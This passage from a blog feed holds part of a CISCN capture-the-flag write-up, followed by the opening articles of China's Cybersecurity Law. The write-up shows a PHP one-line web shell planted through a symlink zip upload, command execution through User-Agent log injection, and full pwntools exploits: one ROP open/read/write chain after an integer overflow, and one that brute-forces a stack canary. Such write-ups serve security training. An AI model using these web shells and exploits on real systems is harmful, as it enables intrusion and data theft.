language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发:"></a>基于国密SM2算法的密钥密文分发:</h4><p>非预期解，在登录获取id并且发送完公钥后，通过quantum获取服务器端密钥的密文后，search查看发现服务器端存在密钥的明文，即quantumStringServer，发送该明文进行check获取flag。</p><p>​                                <a href="https://imgse.com/i/p9LeEZj"><img src="https://s1.ax1x.com/2023/05/27/p9LeEZj.png" alt="p9LeEZj.png" style="zoom: 50%;" />        </a>    </p><blockquote><p>flag{fe362b36-56e5-4b6c-a5cc-12d3e755ce0}</p></blockquote><h4 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量:"></a>可信度量:</h4><p>非预期解，通过命令全局搜索flag字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grep <span class="token operator">-</span>ra <span class="token string">"flag&#123;"</span> <span class="token operator">/</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C\OYUNA5G0`(OO)VX%3$@P947.png)</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿:"></a>烧烤摊儿:</h4><p>首先，分析vip函数，发现无符号整数存在整数溢出，因此考虑输入-1000000使余额溢出到大于100000。</p><p>![img](file:///C:\Users\86198\Documents\Tencent Files\1766871892\Image\C2C]I{EODH[FQ1S]6X$Y}L0N8Y.png)</p><p>之后买下该店后通过栈溢出劫持程序执行流，因为本题禁止了execve的系统调用，因此考虑orw读取flag。只需要控制栈溢出后分别执行open，read，write三个函数。</p><p>完整exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#io = process("./shaokao")</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>name_addr <span class="token operator">=</span> <span class="token number">0x4E60F0</span>open_addr <span class="token operator">=</span> <span class="token number">0x457C90</span>read_addr <span class="token operator">=</span> <span class="token number">0x457DC0</span>write_addr <span class="token operator">=</span> <span class="token number">0x457E60</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40264f</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x40a67e</span>pop_rdx_rbx <span class="token operator">=</span> <span class="token number">0x4a404b</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token comment">#integer overflow</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1000000'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token comment">#rop orw</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="funcanary："><a href="#funcanary：" class="headerlink" title="funcanary：()"></a>funcanary：()</h4><p>简单栈溢出，只不过在栈上放了canary，分析发现存在后门函数backdoor，同时main函数是while(1)循环，这就使得我们输入canary失败时仍然能回到main函数，因此可以通过爆破泄露出canary的内容(8位canary，爆破七次)。程序开启了pie，因此需要爆破后门函数的地址,发现后三位不变，爆破倒数第四位。</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./funcanary'</span><span class="token punctuation">)</span><span class="token comment"># io = remote('', '')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn123'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'welcome\n'</span><span class="token punctuation">)</span>        <span class="token comment">#输入了正确的canary，返回</span>        <span class="token keyword">if</span> <span class="token string">b'have fun'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>            canary <span class="token operator">+=</span> p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">break</span>backdoor <span class="token operator">=</span> <span class="token number">0x1229</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    addr <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">2</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x31'</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    msg <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'flag&#123;'</span> <span class="token keyword">in</span> msg<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全法</title>
      <link href="/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
      <url>/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 